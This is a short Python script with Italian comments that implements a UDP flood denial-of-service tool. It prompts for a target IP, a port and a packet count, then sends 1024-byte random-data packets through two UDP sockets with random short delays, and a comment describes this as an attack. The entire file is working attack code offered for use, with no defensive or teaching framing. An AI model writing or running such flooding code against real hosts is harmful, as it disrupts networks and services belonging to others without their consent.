import socket   #importo il modulo socket
import random   #importo il modulo random
import time     #importo il modulo time

def udp_flood():                    #definisco la funzione udp_flood
    packets = random._urandom(1024) #creo un pacchetto di 1024 byte con dati casuali tramite la funzione _urandom del modulo random

    for x in range(1, num+1):                   #ciclo for per inviare il numero di pacchetti specificato dall'utente
        s.sendto(packets, target)               #invio il pacchetto al target
        send_2.sendto(packets, target)          #invio un secondo pacchetto al target, facendo un attacco multi-thread
        print("#", x*2, "pacchetti inviati")    #stampo il numero di pacchetti inviati (x*2 perchè invio due pacchetti per ciclo)
        time.sleep(random.random() * 0.1)       #pausa casuale tra 0 e 0.1 secondi per variare il tempo tra gli invii
        
destination = input("Inserisci l'IP di destinazione: ")             #chiedo all'utente l'IP di destinazione
port = int(input("Inserisci la porta di destinazione: "))           #chiedo all'utente la porta di destinazione
num = int(input("Inserisci il numero di pacchetti da inviare:"))    #chiedo all'utente il numero di pacchetti da inviare

try:                                                                #creo i socket UDP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)            #creo il primo socket UDP
    send_2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)       #creo il secondo socket UDP
    target = (destination, port)                                    #definisco il target (IP, porta)
except Exception as e:                                              #gestisco eventuali errori nella creazione del socket
    print("Errore nella creazione del socket: ", e)                 #stampo l'errore
    s.close()       #chiudo il socket
    send_2.close()  #chiudo il secondo socket
    exit()          #esco dal programma
udp_flood()         #richiamo la funzione udp_flood